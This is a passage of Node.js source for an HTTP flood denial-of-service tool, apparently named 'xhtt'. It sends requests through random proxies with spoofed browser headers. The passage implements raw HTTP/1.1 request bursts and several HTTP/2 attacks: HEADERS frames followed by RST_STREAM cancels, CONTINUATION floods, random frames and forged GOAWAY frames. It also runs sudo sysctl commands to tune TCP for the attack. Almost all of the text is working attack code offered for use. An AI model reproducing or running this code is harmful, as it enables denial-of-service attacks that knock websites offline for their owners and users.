    const type = Buffer.alloc(1, FRAME_TYPE_RST_STREAM);
    const flags = Buffer.alloc(1, 0);
    const streamIdBuffer = Buffer.alloc(4);
    streamIdBuffer.writeUInt32BE(streamId & 0x7FFFFFFF);
    const errorCodeBuffer = Buffer.alloc(4);
    errorCodeBuffer.writeUInt32BE(errorCode, 0);

    return Buffer.concat([length, type, flags, streamIdBuffer, errorCodeBuffer]);
}

// Fixed the runFlooder function to separate HPACK usage from the HTTP/2 API.
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";

    // Get attack strategy
    const currentStrategy = getAttackStrategy();

    // Select browser profile randomly but with higher weight for Chrome and Firefox
    const browserRandom = Math.random();
    let browserType;
    if (browserRandom < 0.45) {
        browserType = 'chrome';
    } else if (browserRandom < 0.9) {
        browserType = 'firefox';
    } else {
        browserType = 'ios';
    }

    // Generate a target path based on detected protection
    const targetPath = getTargetPath(null, parsedTarget.host, parsedTarget.path);

    // Generate enhanced browser headers
    const dynHeaders = generateBrowserHeaders(browserType, {
        host: parsedTarget.host,
        path: targetPath
    });

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        // --- forceHttp logic ---
        let httpMode;
        if (forceHttp == 1) {
            httpMode = 'http1';
        } else if (forceHttp == 2) {
            httpMode = 'http2';
        } else {
            // mix or undefined: randomize
            httpMode = Math.random() < 0.5 ? 'http2' : 'http1';
        }

        // Print function/mode info only once per mode
        let modeMsg = '[xhtt] Using ';
        if (httpMode === 'http1') modeMsg += 'HTTP/1.1';
        else if (httpMode === 'http2') modeMsg += 'HTTP/2';
        if (forceHttp == 1) modeMsg += ' (--http 1)';
        else if (forceHttp == 2) modeMsg += ' (--http 2)';
        else modeMsg += ' (--http mix)';
        if (cacheBypassFlag) modeMsg += ' | --cache true';
        if (rushAway) modeMsg += ' | --rushaway true';
        if (!loggedModes.has(modeMsg)) {
            console.log(modeMsg);
            loggedModes.add(modeMsg);
        }

        if (httpMode === 'http1') {
            // --- HTTP/1.1 raw request ---
            // Build a simple GET request (can be extended for more realism)
            let req = `GET ${targetPath} HTTP/1.1\r\n` +
                `Host: ${parsedTarget.host}\r\n` +
                `User-Agent: ${dynHeaders['user-agent']}\r\n` +
                `Accept: ${dynHeaders['accept']}\r\n` +
                `Accept-Language: ${dynHeaders['accept-language']}\r\n` +
                `Accept-Encoding: ${dynHeaders['accept-encoding']}\r\n` +
                `Connection: keep-alive\r\n`;
            // Add cache-control if present
            if (dynHeaders['cache-control']) req += `Cache-Control: ${dynHeaders['cache-control']}\r\n`;
            if (dynHeaders['pragma']) req += `Pragma: ${dynHeaders['pragma']}\r\n`;
            if (dynHeaders['referer']) req += `Referer: ${dynHeaders['referer']}\r\n`;
            if (dynHeaders['origin']) req += `Origin: ${dynHeaders['origin']}\r\n`;
            if (dynHeaders['cookie']) req += `Cookie: ${dynHeaders['cookie']}\r\n`;
            // Add all x- headers
            for (const k in dynHeaders) {
                if (k.startsWith('x-')) req += `${k}: ${dynHeaders[k]}\r\n`;
            }
            req += `\r\n`;
            // Send multiple requests per connection
            for (let i = 0; i < args.Rate; i++) {
                connection.write(req);
            }
            setTimeout(() => { if (!connection.destroyed) connection.destroy(); }, 1000);
            return;
        }
        // --- HTTP/2 logic (existing) ---
        // Decide to use HPACK directly or use the HTTP/2 API - not both at the same time.
        const useHpackDirectly = Math.random() > 0.7; // 30% Opportunity to use HPACK directly

        if (useHpackDirectly) {
            // ===== Use HPACK directly =====
            const tlsOptions = {
                port: parsedPort,
                secure: true,
                ALPNProtocols: ["h2"],
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
                socket: connection,
                ecdhCurve: ecdhCurve,
                honorCipherOrder: false,
                host: parsedTarget.host,
                rejectUnauthorized: false,
                secureOptions: secureOptions,
                secureContext: secureContext,
                servername: parsedTarget.host,
                secureProtocol: secureProtocol
            };

            const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

            tlsConn.allowHalfOpen = true;
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 60 * 10000);
            tlsConn.setMaxListeners(0);
            
            const codec = new HPACK();
            let streamIdCounter = 1;
            
            tlsConn.on('connect', () => {
                // Send HTTP/2 connection preface
                tlsConn.write('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n');
                
                // Send SETTINGS frame
                const settingsFrame = createSettingsFrame();
                tlsConn.write(settingsFrame);
                
                // Send WINDOW_UPDATE frame
                const windowUpdateFrame = createWindowUpdateFrame(0, 15663105);
                tlsConn.write(windowUpdateFrame);
                
                // Create an interval for sending frames.
                const attackInterval = setInterval(() => {
                    // Send only when connection is ready
                    if (tlsConn.destroyed) {
                        clearInterval(attackInterval);
                        return;
                    }
                    
                    try {
                        for (let i = 0; i < args.Rate; i++) {
                            // Increment stream IDs by 2 as per HTTP/2 standard.
                            streamIdCounter += 2;
                            
                            // build headers list
                            const headersList = [
                                [':method', 'GET'],
                                [':scheme', 'https'],
                                [':path', targetPath],
                                [':authority', parsedTarget.host],
                                ['user-agent', dynHeaders['user-agent']],
                                ['accept', dynHeaders['accept']],
                                ['accept-language', dynHeaders['accept-language']],
                                ['accept-encoding', dynHeaders['accept-encoding']]
                            ];
                            
                            // Add other important headers
                            if (dynHeaders['sec-ch-ua']) headersList.push(['sec-ch-ua', dynHeaders['sec-ch-ua']]);
                            if (dynHeaders['sec-ch-ua-mobile']) headersList.push(['sec-ch-ua-mobile', dynHeaders['sec-ch-ua-mobile']]);
                            if (dynHeaders['sec-ch-ua-platform']) headersList.push(['sec-ch-ua-platform', dynHeaders['sec-ch-ua-platform']]);
                            
                            // Create and send HEADERS frame
                            const headersFrame = createHeadersFrame(streamIdCounter, headersList, codec);
                            tlsConn.write(headersFrame);
                            
                            // Randomly send RST_STREAM after sending HEADERS (can be done because it doesn't use HTTP/2 API)
                            if (Math.random() > 0.7) {
                                // A slight delay to avoid simultaneous delivery
                                setTimeout(() => {
                                    if (!tlsConn.destroyed) {
                                        const rstFrame = createRST_STREAM(streamIdCounter, RST_STREAM_CANCEL);
                                        tlsConn.write(rstFrame);
                                    }
                                }, Math.floor(Math.random() * 50) + 10);
                            }
                        }
                    } catch (e) {
                        // Silent error handling
                    }
                }, 500);
                
                // Disconnect after a specified time
                setTimeout(() => {
                    clearInterval(attackInterval);
                    if (!tlsConn.destroyed) tlsConn.destroy();
                    if (!connection.destroyed) connection.destroy();
                }, 10000);
            });
            
            tlsConn.on('error', (err) => {
                // Silent error handling
                if (!tlsConn.destroyed) tlsConn.destroy();
                if (!connection.destroyed) connection.destroy();
            });
        } else {
            // ===== Use standard HTTP/2 API =====
            const tlsOptions = {
                port: parsedPort,
                secure: true,
                ALPNProtocols: ["h2"],
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
                socket: connection,
                ecdhCurve: ecdhCurve,
                honorCipherOrder: false,
                host: parsedTarget.host,
                rejectUnauthorized: false,
                secureOptions: secureOptions,
                secureContext: secureContext,
                servername: parsedTarget.host,
                secureProtocol: secureProtocol
            };

            const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

            tlsConn.allowHalfOpen = true;
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 60 * 10000);
            tlsConn.setMaxListeners(0);

            // Get HTTP/2 settings based on browser type and detected protection
            const browserSettings = getBrowserHTTP2Settings(browserType);
            const protectionSettings = getHttp2Settings();
            
            // Merge settings with browser settings taking precedence
            const settings = {
                ...protectionSettings,
                ...browserSettings
            };

            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: settings,
                maxSessionMemory: 3333,
                maxDeflateDynamicTableSize: 4294967295,
                createConnection: () => tlsConn,
                socket: connection,
            });

            client.settings(settings);
            client.setMaxListeners(0);

            client.on("connect", () => {
                const IntervalAttack = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        // Use different attack based on current strategy
                        if (currentStrategy === ATTACK_STRATEGIES.CONTINUATION_FLOOD) {
                            // Create a stream for CONTINUATION flood with browser-specific settings
                            const streamId = client.submitRequest({
                                ...dynHeaders,
                                ':method': 'GET',
                                ':path': targetPath
                            }, { endStream: false });
                            
                            // Send CONTINUATION flood on this stream with browser profile
                            sendContinuationFlood(client, streamId, Math.floor(Math.random() * 30) + 20, browserType);
                        } else {
                            // Create request with priority info if needed
                            const requestOptions = {
                                ...dynHeaders,
                                priority: {
                                    exclusive: Math.random() > 0.5,
                                    parent: Math.floor(Math.random() * 256),
                                    weight: Math.floor(Math.random() * 256),
                                    silent: false
                                }
                            };
                            
                            const request = client.request(requestOptions);
                            
                            // Stream ID available after request is created
                            const streamId = request.id;
                            
                            // Send random HTTP/2 frames to consume server resources
                            sendRandomFrames(client, streamId, Math.floor(args.Rate / 2));
                            
                            // For some targets, send DATA frames with random payloads
                            if (Math.random() > 0.9) {
                                const randomData = Buffer.from(randstr(getRandomInt(256, 4096)));
                                request.write(randomData);
                            }
                            
                            request.on("response", (headers, flags) => {
                                // Collect response data for all requests
                                let data = '';
                                request.on('data', (chunk) => {
                                    data += chunk;
                                });
                                
                                // After a delay, close the request to free resources for new ones
                                setTimeout(() => {
                                    request.close();
                                    request.destroy();
                                }, 500);
                            });
                            
                            request.on("error", () => {
                                request.close();
                                request.destroy();
                            });
                            
                            // End the request
                            request.end();
                        }
                    }
                    // RUSHAWAY: Randomly send GOAWAY frame (30% chance per batch)
                    if (rushAway && Math.random() < 0.3) {
                        try {
                            const errorCodes = [0x0, 0x1, 0x2, 0x5, 0x8];
                            const goawayBuf = Buffer.alloc(8);
                            // Last Stream ID (random or 0)
                            goawayBuf.writeUInt32BE(Math.floor(Math.random() * 1000), 0);
                            // Error code
                            goawayBuf.writeUInt32BE(errorCodes[Math.floor(Math.random() * errorCodes.length)], 4);
                            // Send GOAWAY frame manually
                            client.session && client.session.socket && client.session.socket.write(
                                Buffer.concat([
                                    // Frame header: length(3), type(1), flags(1), streamId(4)
                                    Buffer.from([0x00, 0x00, 0x08, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00]),
                                    goawayBuf
                                ])
                            );
                        } catch (e) { /* ignore */ }
                    }
                }, 500);

                // Clear the interval when the connection is closed
                client.on("close", () => {
                    clearInterval(IntervalAttack);
                    client.destroy();
                    connection.destroy();
                });
            });

            client.on("error", error => {
                client.destroy();
                connection.destroy();
            });
        }
    });
}

// Function for customizing TCP settings to improve attack performance
function TCP_CHANGES_SERVER() {
    // Check the operating system before running the command.
    const platform = os.platform();
    
    // Works only on Linux
    if (platform !== 'linux') {
        console.log(`TCP Optimization: Not available on ${platform}`);
        return;
    }
    
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, (error) => {
        if (error) {
            console.log(`TCP Settings: Error applying - ${error.message}`);
        } else {
            console.log(`TCP Settings: Applied - ${congestionControl}, sack=${sack}, scaling=${windowScaling}`);
        }
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});


